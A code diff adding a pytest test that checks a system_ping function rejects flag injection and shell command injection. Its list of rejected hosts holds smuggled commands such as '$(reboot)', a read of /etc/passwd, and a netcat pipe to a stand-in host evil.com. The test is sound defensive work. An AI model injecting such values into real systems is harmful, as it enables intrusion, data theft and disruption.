@@ -80,3 +80,30 @@ def test_updater_free_port_isolation(monkeypatch):
     # Ensure pkill _failover_ WAS executed for port 10818
     failover_kills_10818 = [c for c in killed_cmds if "_failover_" in str(c)]
     assert len(failover_kills_10818) > 0
+
+
+def test_system_ping_command_injection_defense():
+    """Verifies that system_ping rejects flag injections and shell command injection characters."""
+    from backend.routes.routing_routes.testing import system_ping
+
+    # Empty host
+    res = system_ping("")
+    assert res["success"] is False
+
+    # Flag injection (e.g. -c, -n)
+    res = system_ping("-c 1 127.0.0.1")
+    assert res["success"] is False
+
+    # Shell delimiters and command execution attempts
+    for evil_host in [
+        "127.0.0.1; ls",
+        "127.0.0.1 & whoami",
+        "127.0.0.1 | nc evil.com 1337",
+        "127.0.0.1`id`",
+        "127.0.0.1$(reboot)",
+        "127.0.0.1\ncat /etc/passwd",
+        "127.0.0.1\recho evil",
+        "127.0.0.1 evil.com"
+    ]:
+        res = system_ping(evil_host)
+        assert res["success"] is False, f"Expected injection rejection for host: {evil_host}"
